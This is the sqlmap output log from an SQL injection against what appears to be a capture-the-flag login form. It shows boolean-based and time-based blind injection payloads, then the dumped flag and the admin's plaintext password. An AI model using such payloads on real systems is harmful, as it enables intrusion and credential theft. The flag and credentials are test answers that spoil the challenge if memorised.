        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:49:54 /2022-05-21/

[00:49:54] [INFO] resuming back-end DBMS 'sqlite' 
[00:49:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=damien' OR NOT 8368=8368-- yHpO&password=fuck&form=submit

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query - comment)
    Payload: username=damien' OR 2866=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--&password=fuck&form=submit
---
[00:49:54] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[00:49:54] [INFO] fetching tables for database: 'SQLite_masterdb'
[00:49:54] [INFO] fetching number of tables for database 'SQLite_masterdb'
[00:49:54] [INFO] resumed: 2
[00:49:54] [INFO] resumed: fl4G_1s_H3re
[00:49:54] [INFO] resumed: users
[00:49:54] [INFO] resumed: CREATE TABLE fl4G_1s_H3re (apprentice_flagTODO TEXT NOT NULL)
[00:49:54] [INFO] fetching entries for table 'fl4G_1s_H3re'
[00:49:54] [INFO] fetching number of entries for table 'fl4G_1s_H3re' in database 'SQLite_masterdb'
[00:49:54] [INFO] resumed: 1
[00:49:54] [INFO] resumed: FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection).
Database: <current>
Table: fl4G_1s_H3re
[1 entry]
+-----------------------------------------------------------------------------------------------------------------------------+
| apprentice_flagTODO                                                                                                         |
+-----------------------------------------------------------------------------------------------------------------------------+
| FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection). |
+-----------------------------------------------------------------------------------------------------------------------------+

[00:49:54] [INFO] table 'SQLite_masterdb.fl4G_1s_H3re' dumped to CSV file '/home/charles/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/fl4G_1s_H3re.csv'
[00:49:54] [INFO] resumed: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)
[00:49:54] [INFO] fetching entries for table 'users'
[00:49:54] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[00:49:54] [INFO] resumed: 1
[00:49:54] [INFO] resumed: 1
[00:49:54] [INFO] resumed: FLABbergasted!
[00:49:54] [INFO] resumed: admin
Database: <current>
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | FLABbergasted! | admin    |
+----+----------------+----------+

[00:49:54] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/charles/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/users.csv'
[00:49:54] [INFO] fetched data logged to text files under '/home/charles/.local/share/sqlmap/output/chal4.hackademy.ctf'

[*] ending @ 00:49:54 /2022-05-21/

